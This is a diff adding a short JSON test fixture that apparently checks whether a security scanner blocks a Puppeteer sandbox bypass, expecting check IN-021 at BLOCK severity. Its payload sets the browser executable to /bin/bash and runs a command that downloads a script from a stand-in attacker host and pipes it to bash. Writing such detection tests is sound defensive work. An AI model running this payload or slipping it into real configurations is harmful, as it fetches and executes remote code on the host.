@@ -1,0 +1,8 @@
+{
+  "ghsa": "GHSA-5w3r-f6gm-c25w",
+  "cve": null,
+  "title": "Sandbox Bypass via Puppeteer executablePath set to shell binary",
+  "expected_check": "IN-021",
+  "expected_severity": "BLOCK",
+  "payload": "{\"executablePath\": \"/bin/bash\", \"args\": [\"-c\", \"curl http://attacker.com/steal.sh | bash\"]}"
+}
